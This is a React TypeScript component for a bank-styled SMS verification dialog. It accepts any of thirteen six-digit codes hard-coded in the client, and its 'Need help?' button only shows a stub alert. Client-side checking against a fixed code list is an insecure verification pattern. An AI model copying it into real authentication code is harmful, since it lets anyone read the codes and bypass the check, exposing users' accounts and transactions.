import { useState, useEffect, useRef } from 'react';
import { userData } from '../lib/userData';

interface SmsVerificationProps {
  onVerify: (code: string) => Promise<boolean>;
  onResend: () => Promise<boolean>;
  onClose: () => void;
  phoneNumber?: string;
}

export default function SmsVerification({
  onVerify,
  onResend,
  onClose,
  phoneNumber = userData.phone
}: SmsVerificationProps) {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [error, setError] = useState('');
  const [isResending, setIsResending] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const countdownRef = useRef<NodeJS.Timeout>();

  // List of valid verification codes
  const VALID_CODES = [
    '242172',
    '086542',
    '654326',
    '679932',
    '572178',
    '341922',
    '186922',
    '020225',
    '441215',
    '089221',
    '867111',
    '009922',
    '256221'
  ];

  // Format phone number for display
  const formatPhoneNumber = (phone: string) => {
    const cleaned = phone.replace(/\D/g, '');
    const match = cleaned.match(/^(\d{1})(\d{3})(\d{3})(\d{4})$/);
    if (match) {
      return `+${match[1]} (${match[2]}) •••-${match[4].substring(0, 4)}`;
    }
    return phone;
  };

  // Start countdown timer
  useEffect(() => {
    if (countdown > 0) {
      countdownRef.current = setTimeout(() => setCountdown(countdown - 1), 1000);
    }
    return () => {
      if (countdownRef.current) {
        clearTimeout(countdownRef.current);
      }
    };
  }, [countdown]);

  // Handle code input
  const handleCodeChange = (index: number, value: string) => {
    if (value && !/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value.slice(-1); // Only take the last character
    setCode(newCode);

    // Move to next input or submit if complete
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    } else if (index === 5 && value) {
      handleVerify(newCode.join(''));
    }

    // Clear error when typing
    if (error) setError('');
  };

  // Handle backspace
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  // Handle paste
  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    if (/^\d{6}$/.test(paste)) {
      const newCode = paste.split('').slice(0, 6);
      setCode([...newCode, ...Array(6 - newCode.length).fill('')]);
      handleVerify(paste);
    }
  };

  // Handle verification
  const handleVerify = async (verificationCode: string) => {
    if (verificationCode.length !== 6) return;

    setIsLoading(true);
    setError('');

    try {
      // Check if the code is in our valid codes list
      const isValidCode = VALID_CODES.includes(verificationCode);

      // Call the onVerify callback with the validation result
      const success = isValidCode && await onVerify(verificationCode);

      if (success) {
        // If verification is successful, we'll let the parent component handle the navigation
        // The parent should use the onVerify callback to navigate to TransactionProcessing
        return true;
      } else {
        setError('Invalid verification code. Please try again.');
        // Clear all inputs on error
        setCode(['', '', '', '', '', '']);
        inputRefs.current[0]?.focus();
        return false;
      }
    } catch (err) {
      setError('An error occurred. Please try again.');
      console.error('Verification error:', err);
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  // Handle resend code
  const handleResendCode = async () => {
    if (countdown > 0) return;

    setIsResending(true);
    try {
      const success = await onResend();
      if (success) {
        setCountdown(60);
        setCode(['', '', '', '', '', '']);
        inputRefs.current[0]?.focus();
      }
    } catch (err) {
      console.error('Failed to resend code:', err);
    } finally {
      setIsResending(false);
    }
  };

  // Format time for countdown
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div
      className="sms-verify-overlay"
      onClick={onClose}
      style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0, 0, 0, 0.4)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 1000,
        padding: '24px',
        backdropFilter: 'blur(2px)'
      }}>
      <style>{`
        .sms-verify-card {
          padding: 40px 32px;
        }
        .sms-verify-inputs {
          display: flex;
          justify-content: center;
          gap: 10px;
          margin-bottom: 32px;
          width: 100%;
        }
        .sms-verify-input-field {
          width: 52px;
          height: 64px;
          font-size: 24px;
        }
        @media (max-width: 480px) {
          .sms-verify-card {
            padding: 32px 16px !important;
          }
          .sms-verify-inputs {
            gap: 6px !important;
          }
          .sms-verify-input-field {
            width: 100% !important;
            max-width: 44px !important;
            height: 52px !important;
            font-size: 20px !important;
          }
        }
      `}</style>
      <div
        className="sms-verify-card"
        onClick={(e) => e.stopPropagation()}
        style={{
          backgroundColor: '#f9fafb',
          borderRadius: '16px',
          width: '100%',
          maxWidth: '440px',
          boxShadow: '0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 8px 10px -6px rgba(0, 0, 0, 0.1)',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          textAlign: 'center'
        }}>

        {/* Institutional Icon */}
        <div style={{ marginBottom: '24px' }}>
          <svg
            width="48"
            height="48"
            viewBox="0 0 24 24"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path d="M3 21H21V19H3V21ZM5 17H7V10H5V17ZM11 17H13V10H11V17ZM17 17H19V10H17V17ZM12 3L2 8V9H22V8L12 3Z" fill="#d4af37" />
          </svg>
        </div>

        <h2 style={{
          fontSize: '28px',
          fontWeight: '500',
          color: '#111827',
          marginBottom: '16px',
          fontFamily: "'Segoe UI', Roboto, Helvetica, Arial, sans-serif"
        }}>
          Verify Your Identity
        </h2>

        <p style={{
          fontSize: '16px',
          color: '#6b7280',
          marginBottom: '32px',
          lineHeight: '1.5'
        }}>
          Code sent to {formatPhoneNumber(phoneNumber)}
        </p>

        {error && (
          <div style={{
            backgroundColor: '#fef2f2',
            color: '#dc2626',
            padding: '12px',
            borderRadius: '8px',
            marginBottom: '20px',
            fontSize: '14px',
            width: '100%'
          }}>
            {error}
          </div>
        )}

        {/* OTP Input Group */}
        <div className="sms-verify-inputs">
          {code.map((digit, index) => (
            <input
              key={index}
              ref={(el) => {
                if (el) inputRefs.current[index] = el;
              }}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleCodeChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              onPaste={index === 0 ? handlePaste : undefined}
              disabled={isLoading}
              autoFocus={index === 0}
              className="sms-verify-input-field"
              style={{
                textAlign: 'center',
                backgroundColor: 'transparent',
                border: digit ? '1.5px solid #3b82f6' : '1.5px solid #d1d5db',
                borderRadius: '8px',
                color: '#111827',
                fontWeight: '400',
                transition: 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)',
                outline: 'none',
              }}
              onFocus={(e) => {
                e.target.style.borderColor = '#3b82f6';
                e.target.style.boxShadow = '0 0 0 1px rgba(59, 130, 246, 0.1)';
              }}
              onBlur={(e) => {
                e.target.style.borderColor = digit ? '#3b82f6' : '#d1d5db';
                e.target.style.boxShadow = 'none';
              }}
            />
          ))}
        </div>

        {/* Timer / Resend */}
        <div style={{ marginBottom: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
          {countdown > 0 ? (
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span style={{ fontSize: '15px', color: '#10b981', fontWeight: '500' }}>
                Resend code in {formatTime(countdown)}
              </span>
            </div>
          ) : (
            <button
              onClick={handleResendCode}
              disabled={isResending}
              style={{
                background: 'none',
                border: 'none',
                color: '#3b82f6',
                cursor: 'pointer',
                fontSize: '15px',
                fontWeight: '500',
                padding: 0
              }}
            >
              {isResending ? 'Sending...' : 'Resend Code Now'}
            </button>
          )}
        </div>

        {/* Primary Action */}
        <button
          onClick={() => handleVerify(code.join(''))}
          disabled={isLoading || code.some(digit => !digit)}
          style={{
            width: '100%',
            padding: '16px',
            backgroundColor: (isLoading || code.some(digit => !digit)) ? '#e5e7eb' : '#3b82f6',
            color: (isLoading || code.some(digit => !digit)) ? '#9ca3af' : 'white',
            border: 'none',
            borderRadius: '12px',
            fontSize: '18px',
            fontWeight: '500',
            cursor: (isLoading || code.some(digit => !digit)) ? 'default' : 'pointer',
            transition: 'all 0.2s',
            marginBottom: '24px'
          }}
        >
          {isLoading ? 'Verifying...' : 'Verify Code'}
        </button>

        {/* Secondary Link */}
        <button
          onClick={() => alert('Verification support is currently being processed. Please try again later.')}
          style={{
            background: 'none',
            border: 'none',
            color: '#3b82f6',
            fontSize: '15px',
            textDecoration: 'none',
            cursor: 'pointer',
            fontWeight: '400'
          }}
        >
          Need help?
        </button>
      </div>
    </div>
  );
}
